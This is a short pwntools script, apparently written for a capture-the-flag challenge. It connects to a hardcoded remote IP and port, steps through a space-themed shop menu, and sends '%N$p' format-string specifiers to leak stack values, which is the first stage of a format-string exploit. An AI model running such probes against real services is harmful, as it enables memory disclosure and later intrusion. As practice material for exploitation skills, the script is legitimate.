from pwn import *

#context.log_level = 'debug'

def detect(io):
	for i in range(100):
		svar = '%'+str(i+1)+'$p'
		io.recvuntil('2. Space food')
		io.sendline(b'1')
		io.recvuntil('3. Deathstar(70.00 s.rocks)')
		io.sendline(b'2')
		io.recvuntil('Red or Green Kryptonite?')
		io.sendline(svar.encode())
		buf = io.recvuntil('\n').decode().strip()
		print(str(i+1)+' : '+buf)

ip, port = '142.93.34.45', 30123
io = remote(ip, port)

detect(io)
